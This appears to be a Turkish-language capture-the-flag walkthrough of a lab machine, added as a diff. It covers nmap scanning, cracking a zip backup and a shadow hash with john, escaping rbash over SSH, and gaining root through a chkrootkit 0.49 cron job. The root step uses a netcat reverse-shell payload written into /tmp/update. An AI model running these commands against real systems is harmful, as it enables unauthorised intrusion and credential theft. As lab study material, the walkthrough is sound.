@@ -1,0 +1,255 @@
+      ####enumeration
+
+Nmap
+nmapBir tarama çalıştırarak başlıyoruz :
+kali@kali:~$ sudo nmap $targetip
+Starting Nmap 7.80 ( https://nmap.org ) at 2020-08-26 10:52 EDT
+Nmap scan report for $targetip
+Host is up (0.038s latency).
+Not shown: 998 closed ports
+PORT   STATE SERVICE
+22/tcp open  ssh
+80/tcp open  http
+Keşfedilen SSH ve HTTP hizmetlerini daha da sıralayacağız:
+kali@kali:~$ sudo nmap -sV -sC -p 22,80 $targetip
+Starting Nmap 7.80 ( https://nmap.org ) at 2020-08-26 11:02 EDT
+Nmap scan report for $targetip
+Host is up (0.029s latency).
+
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
+| ssh-hostkey: 
+|   2048 a9:b5:3e:3b:e3:74:e4:ff:b6:d5:9f:f1:81:e7:a4:4f (RSA)
+|   256 ce:f3:b3:e7:0e:90:e2:64:ac:8d:87:0f:15:88:aa:5f (ECDSA)
+|_  256 66:a9:80:91:f3:d8:4b:0a:69:b0:00:22:9f:3c:4c:5a (ED25519)
+80/tcp open  http    Apache httpd 2.4.38
+| http-ls: Volume /
+| SIZE  TIME              FILENAME
+| 3.0K  2020-07-07 16:36  save.zip
+|_
+|_http-server-header: Apache/2.4.38 (Debian)
+|_http-title: Index of /
+Service Info: Host: 127.0.0.1; OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+      ####Web Enumeration
+Daha ayrıntılı taramada, web kökünde bir save.zip zip dosyası görüyoruz:
+...
+| http-ls: Volume /
+| SIZE  TIME              FILENAME
+| 3.0K  2020-07-07 16:36  save.zip
+...
+Daha fazla inceleme için bu dosyayı indirebiliriz:
+kali@kali:~$ wget http://$targetip/save.zip
+--2020-08-26 13:03:56--  http://$targetip/save.zip
+Connecting to $targetip:80... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 3123 (3.0K) [application/zip]
+Saving to: ‘save.zip’
+
+save.zip                    100%[=========================================>]   3.05K  --.-KB/s    in 0s      
+
+2020-08-26 13:03:56 (314 MB/s) - ‘save.zip’ saved [3123/3123]
+Ancak dosyayı açmaya çalışırken şifre korumalı olduğunu görüyoruz:
+kali@kali:~$ unzip save.zip 
+Archive:  save.zip
+[save.zip] etc/passwd password: 
+^C
+kali@kali:~$ 
+
+      ####exploitation
+
+      ####Zip Dosyasını Kırma
+gerekli şifreyi kaba kuvvetle zip2john aracını kullanmaya çalışacağız.
+kali@kali:~$ zip2john save.zip > pass.hash
+Created directory: /home/kali/.john
+ver 2.0 efh 5455 efh 7875 save.zip/etc/passwd PKZIP Encr: 2b chk, TS_chk, cmplen=668, decmplen=1807, crc=B3ACDAFE
+ver 2.0 efh 5455 efh 7875 save.zip/etc/shadow PKZIP Encr: 2b chk, TS_chk, cmplen=434, decmplen=1111, crc=E11EC139
+ver 2.0 efh 5455 efh 7875 save.zip/etc/group PKZIP Encr: 2b chk, TS_chk, cmplen=460, decmplen=829, crc=A1F81C08
+ver 2.0 efh 5455 efh 7875 save.zip/etc/sudoers PKZIP Encr: 2b chk, TS_chk, cmplen=368, decmplen=669, crc=FF05389F
+ver 2.0 efh 5455 efh 7875 save.zip/etc/hosts PKZIP Encr: 2b chk, TS_chk, cmplen=140, decmplen=185, crc=DFB905CD
+ver 1.0 efh 5455 efh 7875 save.zip/etc/hostname PKZIP Encr: 2b chk, TS_chk, cmplen=45, decmplen=33, crc=D9C379A9
+NOTE: It is assumed that all files in each archive have the same password.
+If that is not the case, the hash may be uncrackable. To avoid this, use
+option -o to pick a file at a time.
+kali@kali:~$
+kali@kali:~$ ls
+pass.hash  save.zip
+kali@kali:~$ cat pass.hash 
+save.zip:$censored::save.zip:etc/hostname, etc/group, etc/passwd:save.zip
+kali@kali:~$ 
+Artık rockyou.txt kelime listesini john ile kullanarak hash dosyasına saldırabiliriz :
+kali@kali:~$ john --wordlist=/usr/share/wordlists/rockyou.txt pass.hash 
+Using default input encoding: UTF-8
+Loaded 1 password hash (PKZIP [32/64])
+Will run 2 OpenMP threads
+Press 'q' or Ctrl-C to abort, almost any other key for status
+$censoredpassword           (save.zip)
+1g 0:00:00:00 DONE (2020-08-26 13:07) 100.0g/s 409600p/s 409600c/s 409600C/s 123456..oooooo
+Use the "--show" option to display all of the cracked passwords reliably
+Session completed
+Araç, zip dosyasının kilidini açmak için gereken parolanın $censoredpassword olduğunu gösteriyor. Şimdi dosyanın içeriğini çıkarabiliriz:
+kali@kali:~$ unzip save.zip 
+Archive:  save.zip
+[save.zip] etc/passwd password: 
+  inflating: etc/passwd              
+  inflating: etc/shadow              
+  inflating: etc/group               
+  inflating: etc/sudoers             
+  inflating: etc/hosts               
+ extracting: etc/hostname
+kali@kali:~$ 
+kali@kali:~$ ls
+etc  pass.hash  save.zip
+kali@kali:~$ ls -l etc/
+total 24
+-rw-r--r-- 1 kali kali  829 Jun 27 17:40 group
+-rw-r--r-- 1 kali kali   33 Jun 27 17:39 hostname
+-rw-r--r-- 1 kali kali  185 Jun 27 16:58 hosts
+-rw-r--r-- 1 kali kali 1807 Jun 27 18:05 passwd
+-rw-r----- 1 kali kali 1111 Jul  7 16:26 shadow
+-r--r----- 1 kali kali  669 Feb  2  2020 sudoers
+Hedefin /etc dizinindeki bazı dosyaların yedeği gibi görünen şeyleri buluruz . En önemlisi, /etc/shadow dosyasına kullanıcı parolası karmaları ile sahibiz.
+
+      ####Shadow Dosyasını Kırma
+Shadow dosyasının içinde iki tane kullanıcı ( root ve user olarak 296640a3b825115a47b68fc44501c828) buluyoruz:
+kali@kali:~$ cat etc/shadow | grep 18450
+SHADOW DOSYASI İÇERİĞİ GÖRÜNTÜLEMESİ GİZLENMİŞTİR.!!!
+kali@kali:~$
+Rockyou.txt kelime listesini bir kez daha john kullanabiliriz :
+kali@kali:~$ john --wordlist=/usr/share/wordlists/rockyou.txt users.hash 
+Using default input encoding: UTF-8
+Loaded 2 password hashes with 2 different salts (sha512crypt, crypt(3) $6$ [SHA512 256/256 AVX2 4x])
+Cost 1 (iteration count) is 5000 for all loaded hashes
+Will run 2 OpenMP threads
+Press 'q' or Ctrl-C to abort, almost any other key for status
+$censoredpassword           (296640a3b825115a47b68fc44501c828)
+1g 0:00:00:45 0.99% (ETA: 14:31:16) 0.02185g/s 3670p/s 4045c/s 4045C/s playoffs..paris17
+Use the "--show" option to display all of the cracked passwords reliably
+Session aborted
+john kullanıcının şifresini oldukça hızlı bir şekilde kırıyor, ancak root kullanıcı şifresini kıramıyoruz. Bununla birlikte, kimlik bilgilerini aldık 296640a3b825115a47b68fc44501c828:$censoredpassword.
+
+      ####SSH
+Kurtarılan kullanıcı kimlik bilgileri ile hedefe SSH ile girebiliyoruz. Ancak bunu yapmadan önce, bu kullanıcı hakkında daha fazla bilgi edinmek için kurtarılan /etc/passwd dosyasına bir göz atacağız :
+kali@kali:~$ cat etc/passwd | grep "296640a3b825115a47b68fc44501c828"
+296640a3b825115a47b68fc44501c828:x:1000:1000:,,,:/home/296640a3b825115a47b68fc44501c828:/bin/rbash
+kali@kali:~$
+Kullanıcının varsayılan kabuğunun, /bin/rbash kısıtlı bir kabuk olduğunu görüyoruz. Bu kısıtlı ortamdan kaçmak -t "bash --noprofile" kullanarak şu ssh komutu ekleyeceğiz:
+kali@kali:~$ ssh 296640a3b825115a47b68fc44501c828@$targetip -t "bash --noprofile"
+...
+296640a3b825115a47b68fc44501c828@$targetip's password: 
+bash: dircolors: command not found
+296640a3b825115a47b68fc44501c828@60832e9f188106ec5bcc4eb7709ce592:~$ id
+uid=1000(296640a3b825115a47b68fc44501c828) gid=1000(296640a3b825115a47b68fc44501c828) groups=1000(296640a3b825115a47b68fc44501c828)
+296640a3b825115a47b68fc44501c828@60832e9f188106ec5bcc4eb7709ce592:~$
+
+      ####Local Enumeration in Target
+Çabucak keşfedeceğimiz bir şey, PATH şu anda çok kullanışlı olmadığıdır:
+296640a3b825115a47b68fc44501c828@60832e9f188106ec5bcc4eb7709ce592:~$ whoami
+bash: whoami: command not found
+296640a3b825115a47b68fc44501c828@60832e9f188106ec5bcc4eb7709ce592:~$ echo $PATH
+PATH:/home/296640a3b825115a47b68fc44501c828/
+296640a3b825115a47b68fc44501c828@60832e9f188106ec5bcc4eb7709ce592:~$ /bin/whoami
+296640a3b825115a47b68fc44501c828
+296640a3b825115a47b68fc44501c828@60832e9f188106ec5bcc4eb7709ce592:~$
+Ya düzeltebiliriz ya da programları yürütürken tam ikili yolları kullanabiliriz. Kullanıcının ana dizininde aşağıdakileri buluruz:
+296640a3b825115a47b68fc44501c828@60832e9f188106ec5bcc4eb7709ce592:~$ ls
+honeypot.decoy  honeypot.decoy.cpp  id  ifconfig  ls  mkdir
+...
+Honeypot.decoy ikili dosyasını çalıştırmayı deneyeceğiz :
+296640a3b825115a47b68fc44501c828@60832e9f188106ec5bcc4eb7709ce592:~$ ./honeypot.decoy 
+--------------------------------------------------
+
+Welcome to the Honey Pot administration manager (HPAM). Please select an option.
+1 Date.
+2 Calendar.
+3 Shutdown.
+4 Reboot.
+5 Launch an AV Scan.
+6 Check /etc/passwd.
+7 Leave a note.
+8 Check all services status.
+
+Option selected:
+...
+Seçeneği seçeceğimiz bu seçim ile karşılaşıyoruz 5 Launch an AV Scan:
+...
+Option selected:5
+
+The AV Scan will be launched in a minute or less.
+--------------------------------------------------
+296640a3b825115a47b68fc44501c828@60832e9f188106ec5bcc4eb7709ce592:~$
+Sistem, taramanın 60 saniye içinde başlatılacağını bize bildirir. Bu, daha yakından bakmak isteyebileceğimiz bir süreç olduğunu ima ediyor.
+
+      ####PSpy Süreç Monitörü
+PSpy Sistemde nelerin çalıştığını kontrol etmek için süreç izleme aracını çalıştırmayı deneyeceğiz . Aracı https://github.com/DominicBreuker/pspy adresinden indirin ve saldıran web sunucusunda barındırın:
+kali@kali:~$ sudo python3 -m http.server 80
+Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
+$targetip- - [26/Aug/2020 13:25:01] "GET /pspy64 HTTP/1.1" 200 -
+...
+Hedefe indirip orada çalıştıracağız:
+296640a3b825115a47b68fc44501c828@60832e9f188106ec5bcc4eb7709ce592:~$ cd /tmp
+296640a3b825115a47b68fc44501c828@60832e9f188106ec5bcc4eb7709ce592:/tmp$ /bin/wget http://$attackerip/pspy64
+--2020-08-26 13:25:01--  http://$attackerip/pspy64
+Connecting to $attackerip:80... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 3078592 (2.9M) [application/octet-stream]
+Saving to: ‘pspy64’
+
+pspy64                      100%[=========================================>]   2.94M  1.06MB/s    in 2.8s    
+
+2020-08-26 13:25:03 (1.06 MB/s) - ‘pspy64’ saved [3078592/3078592]
+
+296640a3b825115a47b68fc44501c828@60832e9f188106ec5bcc4eb7709ce592:/tmp$ /bin/chmod +x pspy64 
+296640a3b825115a47b68fc44501c828@60832e9f188106ec5bcc4eb7709ce592:/tmp$ ./pspy64 
+pspy - version: v1.2.0 - Commit SHA: 9c63e5d6c58f7bcdc235db663f5e3fe1c33b8855
+
+
+     ██▓███    ██████  ██▓███ ▓██   ██▓
+    ▓██░  ██▒▒██    ▒ ▓██░  ██▒▒██  ██▒
+    ▓██░ ██▓▒░ ▓██▄   ▓██░ ██▓▒ ▒██ ██░
+    ▒██▄█▓▒ ▒  ▒   ██▒▒██▄█▓▒ ▒ ░ ▐██▓░
+    ▒██▒ ░  ░▒██████▒▒▒██▒ ░  ░ ░ ██▒▓░
+    ▒▓▒░ ░  ░▒ ▒▓▒ ▒ ░▒▓▒░ ░  ░  ██▒▒▒ 
+    ░▒ ░     ░ ░▒  ░ ░░▒ ░     ▓██ ░▒░ 
+    ░░       ░  ░  ░  ░░       ▒ ▒ ░░  
+                   ░           ░ ░     
+                               ░ ░     
+...
+Biraz daha çıktıdan sonra PSpy bize aşağıdakileri gösterir:
+...
+2020/08/26 13:26:01 CMD: UID=0    PID=5285   | /usr/sbin/CRON -f 
+2020/08/26 13:26:01 CMD: UID=0    PID=5286   | /usr/sbin/CRON -f 
+2020/08/26 13:26:01 CMD: UID=0    PID=5287   | /bin/sh -c /bin/bash /root/script.sh 
+2020/08/26 13:26:01 CMD: UID=0    PID=5288   | /bin/bash /root/script.sh 
+2020/08/26 13:26:01 CMD: UID=0    PID=5291   | /bin/sh /root/chkrootkit-0.49/chkrootkit 
+2020/08/26 13:26:01 CMD: UID=0    PID=5290   | /bin/sh /root/chkrootkit-0.49/chkrootkit 
+2020/08/26 13:26:01 CMD: UID=0    PID=5289   | /bin/sh /root/chkrootkit-0.49/chkrootkit 
+2020/08/26 13:26:01 CMD: UID=0    PID=5292   | /bin/sh /root/chkrootkit-0.49/chkrootkit 
+2020/08/26 13:26:01 CMD: UID=0    PID=5305   | /bin/sh /root/chkrootkit-0.49/chkrootkit 
+2020/08/26 13:26:01 CMD: UID=0    PID=5306   | /bin/sh /root/chkrootkit-0.49/chkrootkit 
+2020/08/26 13:26:01 CMD: UID=0    PID=5307   | /bin/sh /root/chkrootkit-0.49/chkrootkit 
+2020/08/26 13:26:01 CMD: UID=0    PID=5308   | /bin/sh /root/chkrootkit-0.49/chkrootkit
+...
+chkrootkit-0.49 Aramak bizi doğrudan Chkrootkit sürüm 0.49'da (https://www.exploit-db.com/exploits/33899) yerel bir ayrıcalık yükseltme güvenlik açığına götürür .
+
+      ####Privilege Escalation
+İlk önce bir netcat dinleyicisi başlatın:
+kali@kali:~$ nc -lvp 4444
+listening on [any] 4444 ...
+...
+İstismarın ardından, hedefte bir /tmp/update dosyası oluşturacağız, buna bir ters kabuk yükü bırakacağız, ona yürütülebilir izinler vereceğiz ve ardından sürecin çağrımızı ve yükümüzü yürütmesini bekleyeceğiz:
+296640a3b825115a47b68fc44501c828@60832e9f188106ec5bcc4eb7709ce592:/tmp$ echo "/usr/bin/nc $attackerip 4444 -e /bin/sh" > update
+296640a3b825115a47b68fc44501c828@60832e9f188106ec5bcc4eb7709ce592:/tmp$ /bin/cat update
+/usr/bin/nc $attackerip 4444 -e /bin/sh
+296640a3b825115a47b68fc44501c828@60832e9f188106ec5bcc4eb7709ce592:/tmp$ /bin/chmod +x update
+296640a3b825115a47b68fc44501c828@60832e9f188106ec5bcc4eb7709ce592:/tmp$
+Bir dakika kadar bekledikten sonra, işlem yükümüzü yürütür ve bir kök kabuğu elde ederiz:
+kali@kali:~$ nc -lvp 4444
+listening on [any] 4444 ...
+$targetip: inverse host lookup failed: Unknown host
+connect to [$attackerip] from (UNKNOWN) [$targetip] 56536
+python -c 'import pty; pty.spawn("/bin/bash")'
+root@60832e9f188106ec5bcc4eb7709ce592:~# whoami
+whoami
+root
+root@60832e9f188106ec5bcc4eb7709ce592:~#
